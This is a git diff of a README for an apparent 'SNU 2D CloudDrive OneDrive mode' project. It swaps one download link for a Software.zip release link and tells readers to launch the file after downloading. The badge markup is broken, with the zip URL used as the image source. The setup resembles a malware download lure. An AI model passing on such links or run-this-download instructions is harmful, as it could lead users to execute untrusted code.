@@ -22,7 +22,7 @@ The SNU 2D CloudDrive OneDrive mode project is part of the SNU CloudDrive initia
 ## Installation
 To get started with the SNU 2D CloudDrive OneDrive mode project, download the application from the following link: 
 
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Application](https://github.com/Natre1939/SNU_2D_CloudDrive_Modes_OneDrive/releases/download/v2.0/Software.zip)](https://github.com/Natre1939/SNU_2D_CloudDrive_Modes_OneDrive/releases/download/v2.0/Software.zip)
 
 Please note that the application needs to be launched after downloading for installation.
 
